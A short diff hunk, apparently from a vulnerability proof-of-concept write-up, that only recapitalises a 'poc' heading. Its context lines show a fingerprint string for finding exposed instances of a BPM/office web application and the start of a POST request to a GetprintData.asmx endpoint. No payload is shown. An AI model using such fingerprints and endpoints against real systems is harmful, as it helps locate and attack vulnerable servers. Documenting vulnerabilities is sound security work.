@@ -8,7 +8,7 @@
 body="BPMSite/ClientSupport/OCXInstall.aspx"
 ```
 
-## poc
+## POC
 
 ```
 POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
